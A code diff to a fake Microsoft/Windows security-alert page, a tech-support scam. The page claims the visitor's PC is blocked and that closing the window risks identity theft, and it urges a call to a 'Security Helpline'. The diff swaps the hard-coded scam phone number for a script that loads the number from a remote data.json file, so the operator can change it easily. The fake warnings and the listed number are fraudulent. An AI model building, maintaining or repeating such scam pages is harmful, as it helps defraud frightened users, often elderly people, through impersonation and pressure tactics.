@@ -327,7 +327,7 @@
         </div>
         <div id="bc"></div>
 <div id="footer">
-    <div id="footer2"><img src="static/microsoft_w.png" alt=""> <span>Contact Supprt</span><div><span>+64 9 802 5985 (Security Helpline)</span></div></div>
+    <div id="footer2"><img src="static/microsoft_w.png" alt=""> <span>Contact Supprt</span><div><span id="tfn1">t</span></div></div>
 </div>
 
 
@@ -343,7 +343,7 @@
     <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.</p>
     <p>Call Microsoft Support immediatly to report this thread. prevent identity theft and unlock access to this device.</p>
     <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
-    <p>Call Microsoft Support: <b>+64 9 802 5985 (Security Helpline)</b></p>
+    <p>Call Microsoft Support: <b id="tfn2"></b></p>
     <button class="buttonn" onclick="">close</button>
 
 </div>
@@ -383,7 +383,7 @@
     <hr>
     <p>
       Access to this PC has been blocked for security reasons.<br>
-      <b style="color: #0078d7;">Contact Windows Support: +64 9 802 5985 (Toll Free)</b>
+      <b id="tfn3" style="color: #0078d7;"></b>
     </p>
     <p class="note">
       Note: If you think this Notification is by error, report immediately to Windows Support to halt 
@@ -636,6 +636,17 @@
    
     });
 </script>
+<script>
+    // Force fresh copy to avoid GitHub Pages caching
+    fetch("data.json?nocache=" + Date.now())
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("tfn1").innerText = data.tfn +" (Security Helpline)";
+        document.getElementById("tfn2").innerText = data.tfn +" (Security Helpline)";
+        document.getElementById("tfn3").innerText = "Contact Windows Support: " + data.tfn + " (Toll Free)";
+      })
+      .catch(err => console.error("Failed to load JSON", err));
+  </script>
 <script>
     let play=false
     // Drag functionality
